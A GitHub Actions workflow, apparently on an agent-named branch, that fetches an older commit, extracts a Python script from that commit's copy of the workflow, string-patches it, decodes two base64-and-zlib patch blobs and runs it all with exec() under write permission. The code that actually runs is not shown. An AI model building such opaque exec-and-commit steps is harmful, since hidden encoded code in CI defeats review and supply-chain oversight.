name: Kefreyt reclamation verification
on:
  push:
    branches: [codex/val-reclamation-category]
    paths: [.github/workflows/val-reclamation-check.yml]
permissions:
  contents: write
jobs:
  verify:
    if: github.repository == 'worker2of2month/A-DISCORD' && github.ref == 'refs/heads/codex/val-reclamation-category'
    runs-on: ubuntu-latest
    timeout-minutes: 6
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install validator dependencies
        run: python -m pip install Pillow numpy PyYAML
      - name: Verify and commit the category fix
        run: |
          python - <<'PY'
          import base64, re, subprocess, yaml, zlib
          original = '8a42ecdfeb4b455abcab5e5ba97f9dae6a6837da'
          subprocess.run(['git', 'fetch', '--depth=1', 'origin', original], check=True)
          config = yaml.safe_load(subprocess.check_output(['git', 'show', original + ':.github/workflows/val-reclamation-check.yml'], text=True))
          step = next(step for step in config['jobs']['verify']['steps'] if step.get('name') == 'Verify and commit the category fix')
          source = step['run'].split("python - <<'PY'\n", 1)[1].rsplit('\nPY', 1)[0]
          for old, new in [('FtosV5pqxS8', 'FtosV5qxS8'), ('voFoFZER2qu', 'voFoFfZER2qu')]:
              assert source.count(old) == 1, old
              source = source.replace(old, new, 1)
          patches = re.findall(r"apply_patch\('([^']+)'\)", source)
          assert len(patches) == 2
          for patch in patches:
              zlib.decompress(base64.b64decode(patch, validate=True))
          exec(compile(source, 'reclamation-verify', 'exec'))
          PY
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: reclamation-verification
          path: /tmp/reclamation-logs/
